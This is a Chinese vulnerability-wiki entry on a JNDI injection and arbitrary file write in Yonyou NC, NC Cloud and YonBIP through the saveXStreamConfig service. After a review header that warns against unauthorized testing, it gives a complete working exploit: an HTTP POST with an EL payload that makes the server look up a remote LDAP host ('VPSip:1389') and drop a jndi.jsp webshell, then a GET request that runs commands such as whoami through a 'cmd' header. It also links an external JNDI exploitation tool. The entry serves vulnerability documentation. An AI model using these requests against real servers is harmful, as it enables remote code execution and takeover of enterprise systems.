---
source: "Threekiii/Vulnerability-Wiki"
title: "用友NC/NCCloud/YonBIP saveXStreamConfig JNDI链"
product: "用友NC/NCCloud/YonBIP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CNVD-C-2023-76801"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "NC63/633/65、NCC1903–2111、BIP2207"
prerequisites: "前台声明，JNDI出网/容器依赖"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/%E7%94%A8%E5%8F%8B-NC-Cloud-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CNVD-C-2023-76801.md"
id: "vw-9133e27377af6b00e2f51d5c"
entity_id: "ve-9133e27377af6b00e2f51d5c"
schema_version: "1"
---

# 用友NC/NCCloud/YonBIP saveXStreamConfig JNDI链

## 条目说明

- 对象与具体问题：用友NC/NCCloud/YonBIP；saveXStreamConfig JNDI链
- 版本、配置及部署条件：NC63/633/65、NCC1903–2111、BIP2207
- 认证与权限前提：前台声明，JNDI出网/容器依赖
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- CNVD-C-2023-76801特殊报告号保留，不强改普通CNVD
- jndi.jsp前后一致可补163
- 编号官方公告/补丁build缺，WAF只是缓解

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

### 漏洞描述

用友 NC 及 NC Cloud 系统存在任意文件上传漏洞，攻击者可通过 uapjs（jsinvoke）应用构造恶意请求非法上传后门程序，此漏洞可以给 NC 服务器预埋后门，从而可以随意操作服务器。

### 漏洞影响

```
NC63、NC633、NC65
NC Cloud1903、NC Cloud1909
NC Cloud2005、NC Cloud2105、NC Cloud2111
YonBIP 高级版 2207
```

### 漏洞复现

JNDI：https://github.com/WhiteHSBG/JNDIExploit

exp：

```http
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
 
{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}","webapps/nc_web/jndi.jsp"]}
```

exp 中使用的是 JNDI 工具的 TomcatEcho 回显链 ，执行命令并回显：

```http
GET /jndi.jsp HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
cmd: whoami
```

### 漏洞修复

1. 官方已经发布修复补丁，请进行升级。
2. 或者进行 waf 等安全部署拦截恶意字符

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
